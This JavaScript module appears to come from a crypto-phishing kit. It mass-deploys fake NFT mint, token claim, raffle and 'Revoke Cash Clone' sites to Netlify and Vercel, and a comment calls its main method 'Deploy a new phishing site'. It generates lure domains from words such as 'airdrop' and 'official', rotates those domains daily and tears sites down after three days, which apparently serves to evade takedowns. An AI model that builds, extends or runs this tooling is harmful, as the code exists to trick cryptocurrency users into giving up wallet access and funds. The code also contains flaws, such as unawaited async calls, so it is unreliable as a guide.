// backend/modules/autoDeployer.js
import { NETLIFY_ACCESS_TOKEN, VERCEL_ACCESS_TOKEN, GITHUB_PAGES_TOKEN } from '../config.js';
import { securityManager } from './securityManager.js';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

export class AutoDeployer {
    constructor() {
        this.netlifyToken = NETLIFY_ACCESS_TOKEN;
        this.vercelToken = VERCEL_ACCESS_TOKEN;
        this.githubToken = GITHUB_PAGES_TOKEN;
        
        this.activeDeployments = new Map();
        this.deploymentTemplates = new Map();
        this.domainPool = new Set();
        this.isInitialized = false; // ← ADD THIS
        
        this.netlifyConfig = {
            baseUrl: 'https://api.netlify.com',
            endpoints: {
                sites: '/api/v1/sites',
                deploys: '/api/v1/deploys',
                forms: '/api/v1/forms'
            },
            headers: {
                'Authorization': `Bearer ${this.netlifyToken}`,
                'Content-Type': 'application/json'
            }
        };

        this.vercelConfig = {
            baseUrl: 'https://api.vercel.com',
            endpoints: {
                projects: '/v9/projects',
                deployments: '/v13/deployments',
                domains: '/v9/domains'
            },
            headers: {
                'Authorization': `Bearer ${this.vercelToken}`,
                'Content-Type': 'application/json'
            }
        };

        this.githubConfig = {
            baseUrl: 'https://api.github.com',
            endpoints: {
                repos: '/repos',
                pages: '/pages',
                deployments: '/deployments'
            },
            headers: {
                'Authorization': `token ${this.githubToken}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        };

        this.deploymentPlatforms = {
            netlify: { enabled: !!this.netlifyToken, priority: 1 },
            vercel: { enabled: !!this.vercelToken, priority: 2 },
            github: { enabled: !!this.githubToken, priority: 3 }
        };

        this.templateTypes = {
            'nft-mint': {
                name: 'NFT Mint Site',
                files: ['index.html', 'style.css', 'app.js', 'config.js'],
                dependencies: ['web3.js', 'ethers.js'],
                buildCommand: 'npm run build',
                outputDir: 'dist'
            },
            'token-claim': {
                name: 'Token Claim Site',
                files: ['index.html', 'style.css', 'claim.js', 'utils.js'],
                dependencies: ['web3.js', 'axios'],
                buildCommand: 'npm run build',
                outputDir: 'build'
            },
            'raffle': {
                name: 'Raffle Entry Site',
                files: ['index.html', 'style.css', 'raffle.js', 'form.js'],
                dependencies: ['web3.js', 'jquery'],
                buildCommand: 'npm run build',
                outputDir: 'public'
            },
            'revoke': {
                name: 'Revoke Cash Clone',
                files: ['index.html', 'style.css', 'revoke.js', 'security.js'],
                dependencies: ['web3.js', 'ethers.js'],
                buildCommand: 'npm run build',
                outputDir: 'dist'
            }
        };

        this.domainRotation = {
            enabled: true,
            tlds: ['.xyz', '.io', '.app', '.com', '.net', '.org'],
            patterns: ['mint', 'claim', 'reward', 'airdrop', 'official', 'app', 'portal']
        };

        this.loadTemplates();
        this.loadDomainPool();
    }

    // ← ADD THIS METHOD
    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            
            // Verify platform connections
            await this.verifyConnections();
            
            // Start background tasks
            this.startDomainRotation();
            this.startDeploymentCleanup();
            
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    // Initialize auto deployer
    async init() {
        console.log('🚀 Initializing auto deployer...');
        
        // Verify platform connections
        await this.verifyConnections();
        
        // Start background tasks
        this.startDomainRotation();
        this.startDeploymentCleanup();
        
        console.log('✅ Auto deployer initialized');
        return true;
    }

    // Verify platform connections
    async verifyConnections() {
        const results = {};
        
        if (this.netlifyToken) {
            try {
                const response = await fetch(`${this.netlifyConfig.baseUrl}/api/v1/user`, {
                    headers: this.netlifyConfig.headers
                });
                results.netlify = response.ok;
            } catch {
                results.netlify = false;
            }
        }

        if (this.vercelToken) {
            try {
                const response = await fetch(`${this.vercelConfig.baseUrl}/v2/user`, {
                    headers: this.vercelConfig.headers
                });
                results.vercel = response.ok;
            } catch {
                results.vercel = false;
            }
        }

        if (this.githubToken) {
            try {
                const response = await fetch(`${this.githubConfig.baseUrl}/user`, {
                    headers: this.githubConfig.headers
                });
                results.github = response.ok;
            } catch {
                results.github = false;
            }
        }

        console.log('🔗 Platform connections:', results);
        return results;
    }

    // Deploy a new phishing site
    async deploySite(templateType, customConfig = {}, platform = 'auto') {
        console.log(`🌐 Deploying ${templateType} site...`);
        
        const deploymentId = `deploy_${Date.now()}_${Math.random().toString(36).substr(2, 8)}`;
        
        try {
            // Select deployment platform
            const targetPlatform = await this.selectDeploymentPlatform(platform);
            if (!targetPlatform) {
                throw new Error('No deployment platforms available');
            }

            // Generate domain name
            const domain = await this.generateDomainName();
            
            // Prepare deployment package
            const deploymentPackage = await this.prepareDeploymentPackage(templateType, domain, customConfig);
            
            // Deploy to selected platform
            let deploymentResult;
            switch (targetPlatform) {
                case 'netlify':
                    deploymentResult = await this.deployToNetlify(deploymentPackage);
                    break;
                case 'vercel':
                    deploymentResult = await this.deployToVercel(deploymentPackage);
                    break;
                case 'github':
                    deploymentResult = await this.deployToGitHub(deploymentPackage);
                    break;
                default:
                    throw new Error(`Unsupported platform: ${targetPlatform}`);
            }

            // Store deployment info
            const deployment = {
                id: deploymentId,
                platform: targetPlatform,
                template: templateType,
                domain: deploymentResult.domain,
                url: deploymentResult.url,
                status: 'deployed',
                deployedAt: Date.now(),
                config: customConfig,
                deploymentId: deploymentResult.id
            };

            this.activeDeployments.set(deploymentId, deployment);
            await securityManager.storeDeployment(deploymentId, deployment);

            console.log(`✅ Site deployed: ${deployment.url}`);
            return deployment;

        } catch (error) {
            console.error('❌ Deployment failed:', error);
            
            const failedDeployment = {
                id: deploymentId,
                platform: platform,
                template: templateType,
                status: 'failed',
                error: error.message,
                deployedAt: Date.now()
            };

            this.activeDeployments.set(deploymentId, failedDeployment);
            throw error;
        }
    }

    // Select the best deployment platform
    async selectDeploymentPlatform(preference = 'auto') {
        if (preference !== 'auto' && this.deploymentPlatforms[preference]?.enabled) {
            return preference;
        }

        // Get available platforms sorted by priority
        const available = Object.entries(this.deploymentPlatforms)
            .filter(([_, config]) => config.enabled)
            .sort((a, b) => a[1].priority - b[1].priority)
            .map(([name]) => name);

        return available[0] || null;
    }

    // Generate a domain name
    async generateDomainName() {
        if (this.domainPool.size > 0) {
            const domain = Array.from(this.domainPool)[0];
            this.domainPool.delete(domain);
            return domain;
        }

        // Generate new domain
        const pattern = this.domainRotation.patterns[
            Math.floor(Math.random() * this.domainRotation.patterns.length)
        ];
        const tld = this.domainRotation.tlds[
            Math.floor(Math.random() * this.domainRotation.tlds.length)
        ];
        const randomId = Math.random().toString(36).substr(2, 8);
        
        return `${pattern}-${randomId}${tld}`;
    }

    // Prepare deployment package
    async prepareDeploymentPackage(templateType, domain, customConfig) {
        const template = this.templateTypes[templateType];
        if (!template) {
            throw new Error(`Unknown template type: ${templateType}`);
        }

        // Create temporary directory
        const tempDir = path.join(__dirname, 'temp', `deploy_${Date.now()}`);
        fs.mkdirSync(tempDir, { recursive: true });

        // Copy template files
        await this.copyTemplateFiles(templateType, tempDir, domain, customConfig);

        // Create platform-specific config
        await this.createPlatformConfig(tempDir, template);

        return {
            directory: tempDir,
            domain: domain,
            template: templateType,
            config: customConfig
        };
    }

    // Copy template files
    async copyTemplateFiles(templateType, targetDir, domain, customConfig) {
        const templateDir = path.join(__dirname, 'templates', templateType);
        
        if (!fs.existsSync(templateDir)) {
            throw new Error(`Template not found: ${templateType}`);
        }

        // Copy all files from template directory
        const files = fs.readdirSync(templateDir);
        for (const file of files) {
            if (file === '.gitkeep') continue;
            
            const sourcePath = path.join(templateDir, file);
            const targetPath = path.join(targetDir, file);
            
            if (fs.statSync(sourcePath).isDirectory()) {
                fs.cpSync(sourcePath, targetPath, { recursive: true });
            } else {
                fs.copyFileSync(sourcePath, targetPath);
            }
        }

        // Update configuration with domain and custom settings
        await this.updateConfigFiles(targetDir, domain, customConfig);
    }

    // Update configuration files
    async updateConfigFiles(dir, domain, customConfig) {
        const configFile = path.join(dir, 'config.js');
        if (fs.existsSync(configFile)) {
            let content = fs.readFileSync(configFile, 'utf8');
            
            // Replace placeholders
            content = content.replace(/{{DOMAIN}}/g, domain)
                           .replace(/{{TIMESTAMP}}/g, Date.now())
                           .replace(/{{CONFIG}}/g, JSON.stringify(customConfig));
            
            fs.writeFileSync(configFile, content);
        }

        // Update HTML files
        const htmlFiles = fs.readdirSync(dir).filter(f => f.endsWith('.html'));
        for (const file of htmlFiles) {
            const filePath = path.join(dir, file);
            let content = fs.readFileSync(filePath, 'utf8');
            
            content = content.replace(/{{DOMAIN}}/g, domain)
                           .replace(/{{TITLE}}/g, customConfig.title || 'Official Site');
            
            fs.writeFileSync(filePath, content);
        }
    }

    // Create platform-specific configuration
    async createPlatformConfig(dir, template) {
        // Netlify config
        const netlifyToml = `
[build]
  publish = "${template.outputDir}"
  command = "${template.buildCommand}"

[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200
`;
        fs.writeFileSync(path.join(dir, 'netlify.toml'), netlifyToml);

        // Vercel config
        const vercelJson = {
            version: 2,
            builds: [
                {
                    src: `/${template.outputDir}/**/*`,
                    use: '@vercel/static'
                }
            ],
            routes: [
                {
                    src: '/(.*)',
                    dest: `/${template.outputDir}/$1`
                }
            ]
        };
        fs.writeFileSync(path.join(dir, 'vercel.json'), JSON.stringify(vercelJson, null, 2));

        // GitHub Pages config (if needed)
        if (template.buildCommand) {
            const githubWorkflowDir = path.join(dir, '.github', 'workflows');
            fs.mkdirSync(githubWorkflowDir, { recursive: true });
            
            const workflowYml = `
name: Deploy to GitHub Pages

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build-and-deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      - name: Install dependencies
        run: npm install
      - name: Build
        run: ${template.buildCommand}
      - name: Deploy
        uses: peaceiris/actions-gh-pages@v3
        with:
          github_token: \${{ secrets.GITHUB_TOKEN }}
          publish_dir: ./${template.outputDir}
`;
            fs.writeFileSync(path.join(githubWorkflowDir, 'deploy.yml'), workflowYml);
        }
    }

    // Deploy to Netlify
    async deployToNetlify(deploymentPackage) {
        if (!this.netlifyToken) {
            throw new Error('Netlify access token not configured');
        }

        // Create zip file of deployment directory
        const zipPath = await this.createZipFile(deploymentPackage.directory);
        
        // Deploy to Netlify
        const formData = new FormData();
        formData.append('file', fs.createReadStream(zipPath));
        
        const response = await fetch(`${this.netlifyConfig.baseUrl}/api/v1/sites`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${this.netlifyToken}`
            },
            body: formData
        });

        if (!response.ok) {
            throw new Error(`Netlify deployment failed: ${response.status}`);
        }

        const result = await response.json();
        
        // Clean up temp files
        fs.unlinkSync(zipPath);
        fs.rmSync(deploymentPackage.directory, { recursive: true });

        return {
            id: result.id,
            domain: result.subdomain || result.custom_domain,
            url: result.ssl_url || result.url,
            platform: 'netlify'
        };
    }

    // Deploy to Vercel
    async deployToVercel(deploymentPackage) {
        if (!this.vercelToken) {
            throw new Error('Vercel access token not configured');
        }

        // Create zip file
        const zipPath = await this.createZipFile(deploymentPackage.directory);
        
        // Deploy to Vercel
        const formData = new FormData();
        formData.append('file', fs.createReadStream(zipPath));
        formData.append('name', deploymentPackage.domain);
        
        const response = await fetch(`${this.vercelConfig.baseUrl}/v13/deployments`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${this.vercelToken}`
            },
            body: formData
        });

        if (!response.ok) {
            throw new Error(`Vercel deployment failed: ${response.status}`);
        }

        const result = await response.json();
        
        // Clean up
        fs.unlinkSync(zipPath);
        fs.rmSync(deploymentPackage.directory, { recursive: true });

        return {
            id: result.id,
            domain: result.alias[0] || result.url,
            url: result.url,
            platform: 'vercel'
        };
    }

    // Deploy to GitHub Pages
    async deployToGitHub(deploymentPackage) {
        if (!this.githubToken) {
            throw new Error('GitHub access token not configured');
        }

        // This would involve creating a repo, committing files, and enabling Pages
        // Simplified implementation for now
        throw new Error('GitHub Pages deployment not fully implemented');
    }

    // Create zip file of directory
    async createZipFile(sourceDir) {
        const zip = require('adm-zip');
        const zipPath = path.join(__dirname, 'temp', `deploy_${Date.now()}.zip`);
        
        const zipFile = new zip();
        zipFile.addLocalFolder(sourceDir);
        zipFile.writeZip(zipPath);
        
        return zipPath;
    }

    // Batch deploy multiple sites
    async batchDeploySites(deployments) {
        console.log(`🚀 Batch deploying ${deployments.length} sites...`);
        
        const results = {};
        
        for (const deployment of deployments) {
            try {
                results[deployment.id || deployment.template] = await this.deploySite(
                    deployment.template,
                    deployment.config || {},
                    deployment.platform || 'auto'
                );
                
                // Rate limiting
                await new Promise(resolve => setTimeout(resolve, 5000));
                
            } catch (error) {
                results[deployment.id || deployment.template] = {
                    success: false,
                    error: error.message
                };
            }
        }
        
        return results;
    }

    // Rotate domains (replace taken domains)
    async rotateDomain(deploymentId) {
        const deployment = this.activeDeployments.get(deploymentId);
        if (!deployment) {
            throw new Error('Deployment not found');
        }

        const newDomain = await this.generateDomainName();
        
        // Update deployment with new domain
        deployment.domain = newDomain;
        deployment.url = deployment.url.replace(/[^/]+\.[^/]+$/, newDomain);
        deployment.rotatedAt = Date.now();
        
        this.activeDeployments.set(deploymentId, deployment);
        
        console.log(`🔄 Domain rotated: ${deployment.url}`);
        return deployment;
    }

    // Take down deployment
    async takeDownDeployment(deploymentId) {
        const deployment = this.activeDeployments.get(deploymentId);
        if (!deployment) {
            throw new Error('Deployment not found');
        }

        try {
            let success = false;
            
            switch (deployment.platform) {
                case 'netlify':
                    success = await this.deleteNetlifySite(deployment.deploymentId);
                    break;
                case 'vercel':
                    success = await this.deleteVercelDeployment(deployment.deploymentId);
                    break;
                case 'github':
                    success = await this.deleteGitHubRepo(deployment.deploymentId);
                    break;
            }

            if (success) {
                deployment.status = 'taken_down';
                deployment.takenDownAt = Date.now();
                this.activeDeployments.set(deploymentId, deployment);
                
                console.log(`🗑️ Deployment taken down: ${deploymentId}`);
            }
            
            return success;
            
        } catch (error) {
            console.error('❌ Take down failed:', error);
            return false;
        }
    }

    // Delete Netlify site
    async deleteNetlifySite(siteId) {
        const response = await fetch(`${this.netlifyConfig.baseUrl}/api/v1/sites/${siteId}`, {
            method: 'DELETE',
            headers: this.netlifyConfig.headers
        });
        
        return response.ok;
    }

    // Delete Vercel deployment
    async deleteVercelDeployment(deploymentId) {
        const response = await fetch(`${this.vercelConfig.baseUrl}/v13/deployments/${deploymentId}`, {
            method: 'DELETE',
            headers: this.vercelConfig.headers
        });
        
        return response.ok;
    }

    // Load templates from filesystem
    loadTemplates() {
        const templatesDir = path.join(__dirname, 'templates');
        
        if (!fs.existsSync(templatesDir)) {
            fs.mkdirSync(templatesDir, { recursive: true });
            // Create template subdirectories
            for (const templateType of Object.keys(this.templateTypes)) {
                const templateDir = path.join(templatesDir, templateType);
                fs.mkdirSync(templateDir, { recursive: true });
                // Create placeholder files
                fs.writeFileSync(path.join(templateDir, '.gitkeep'), '');
            }
            console.warn('⚠️ Template directory created - please add template files');
            return;
        }

        // Load existing templates
        const templateDirs = fs.readdirSync(templatesDir);
        for (const dir of templateDirs) {
            if (this.templateTypes[dir]) {
                this.templateTypes[dir].loaded = true;
            }
        }
    }

    // Load domain pool from storage
    loadDomainPool() {
        // This would load pre-generated domains from a file or database
        // For now, initialize with some random domains
        for (let i = 0; i < 10; i++) {
            this.domainPool.add(this.generateDomainName());
        }
    }

    // Start domain rotation background task
    startDomainRotation() {
        setInterval(async () => {
            try {
                // Replenish domain pool
                while (this.domainPool.size < 20) {
                    this.domainPool.add(this.generateDomainName());
                }
                
                // Rotate old deployments
                const now = Date.now();
                for (const [id, deployment] of this.activeDeployments.entries()) {
                    if (deployment.status === 'deployed' && 
                        now - deployment.deployedAt > 86400000) { // 24 hours
                        await this.rotateDomain(id);
                    }
                }
            } catch (error) {
                console.error('❌ Domain rotation failed:', error);
            }
        }, 3600000); // Every hour
    }

    // Clean up old deployments
    startDeploymentCleanup() {
        setInterval(async () => {
            try {
                const now = Date.now();
                for (const [id, deployment] of this.activeDeployments.entries()) {
                    // Take down deployments older than 72 hours
                    if (deployment.status === 'deployed' && 
                        now - deployment.deployedAt > 259200000) {
                        await this.takeDownDeployment(id);
                    }
                    
                    // Remove failed deployments older than 24 hours
                    if (deployment.status === 'failed' && 
                        now - deployment.deployedAt > 86400000) {
                        this.activeDeployments.delete(id);
                    }
                }
            } catch (error) {
                console.error('❌ Deployment cleanup failed:', error);
            }
        }, 21600000); // Every 6 hours
    }

    // Get deployment statistics
    getDeploymentStats() {
        const stats = {
            total: this.activeDeployments.size,
            byStatus: {},
            byPlatform: {},
            byTemplate: {},
            active: 0,
            failed: 0
        };
        
        for (const deployment of this.activeDeployments.values()) {
            stats.byStatus[deployment.status] = (stats.byStatus[deployment.status] || 0) + 1;
            stats.byPlatform[deployment.platform] = (stats.byPlatform[deployment.platform] || 0) + 1;
            stats.byTemplate[deployment.template] = (stats.byTemplate[deployment.template] || 0) + 1;
            
            if (deployment.status === 'deployed') stats.active++;
            if (deployment.status === 'failed') stats.failed++;
        }
        
        return stats;
    }
}

// Create singleton instance
export const autoDeployer = new AutoDeployer();